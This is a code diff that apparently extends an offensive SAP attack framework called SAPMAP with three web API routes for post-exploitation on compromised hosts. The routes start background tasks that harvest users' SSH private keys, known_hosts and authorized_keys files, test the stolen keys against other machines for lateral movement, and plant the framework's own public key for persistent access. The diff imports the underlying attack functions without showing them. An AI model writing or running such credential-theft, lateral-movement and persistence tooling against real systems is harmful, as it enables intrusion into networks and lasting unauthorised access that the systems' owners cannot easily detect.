@@ -3115,6 +3115,113 @@ def create_app(api: SAPMAPApi) -> Bottle:
         return json.dumps({"status": "started",
                            "scc_host": scc_host})
 
+    # -- SSH key harvest / lateral movement / persistence ----------------
+
+    @app.route("/api/node/<sid>/ssh_harvest", method="POST")
+    def node_ssh_harvest(sid):
+        """Phase 1: enumerate OS users, exfiltrate SSH keys, parse
+        known_hosts + authorized_keys + config."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        ch = data.get("channel", "auto")
+
+        def _run():
+            _task_start(f"{sid}:ssh_harvest",
+                        f"{sid}: SSH key harvest")
+            try:
+                from sap_ssh_lateral import ssh_harvest
+                res = ssh_harvest(node, api.state, channel=ch)
+                if not res.get("ok"):
+                    print(f"[-] {sid}: ssh_harvest: {res.get('error')}")
+                else:
+                    print(f"[+] {sid}: ssh_harvest → "
+                          f"{len(res.get('keys', []))} key(s), "
+                          f"{len(res.get('known_hosts_targets', []))} "
+                          f"target(s)")
+            except Exception as e:
+                print(f"[-] {sid}: ssh_harvest error: {e}")
+                import traceback; traceback.print_exc()
+            finally:
+                _task_end(f"{sid}:ssh_harvest")
+
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/ssh_test_keys", method="POST")
+    def node_ssh_test_keys(sid):
+        """Phase 2: test harvested SSH keys against known targets."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        ch = data.get("channel", "auto")
+
+        def _run():
+            _task_start(f"{sid}:ssh_test_keys",
+                        f"{sid}: SSH lateral movement test")
+            try:
+                from sap_ssh_lateral import ssh_harvest, ssh_test_keys
+                h = ssh_harvest(node, api.state, channel=ch)
+                if not h.get("ok"):
+                    print(f"[-] {sid}: ssh_test_keys — harvest "
+                          f"failed: {h.get('error')}")
+                    return
+                r = ssh_test_keys(node, api.state,
+                                  harvest_result=h, channel=ch)
+                if not r.get("ok"):
+                    print(f"[-] {sid}: ssh_test_keys: {r.get('error')}")
+                else:
+                    print(f"[+] {sid}: ssh_test_keys → "
+                          f"{len(r.get('successful', []))}/"
+                          f"{r.get('tested', 0)} successful")
+            except Exception as e:
+                print(f"[-] {sid}: ssh_test_keys error: {e}")
+                import traceback; traceback.print_exc()
+            finally:
+                _task_end(f"{sid}:ssh_test_keys")
+
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/ssh_plant_key", method="POST")
+    def node_ssh_plant_key(sid):
+        """Phase 3: plant SAPMAP SSH pubkey for persistence."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        ch = data.get("channel", "auto")
+        target_user = data.get("target_user", "")
+
+        def _run():
+            _task_start(f"{sid}:ssh_plant_key",
+                        f"{sid}: SSH key plant")
+            try:
+                from sap_ssh_lateral import ssh_plant_key
+                res = ssh_plant_key(node, api.state,
+                                    target_user=target_user,
+                                    channel=ch)
+                if not res.get("ok"):
+                    print(f"[-] {sid}: ssh_plant_key: "
+                          f"{res.get('error')}")
+                else:
+                    print(f"[+] {sid}: ssh_plant_key → "
+                          f"{res.get('target_user')} planted")
+                    node.ssh_keys_planted = True
+            except Exception as e:
+                print(f"[-] {sid}: ssh_plant_key error: {e}")
+                import traceback; traceback.print_exc()
+            finally:
+                _task_end(f"{sid}:ssh_plant_key")
+
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/harvest_scc_mappings", method="POST")
     def node_harvest_scc_mappings(sid):
         response.content_type = "application/json"
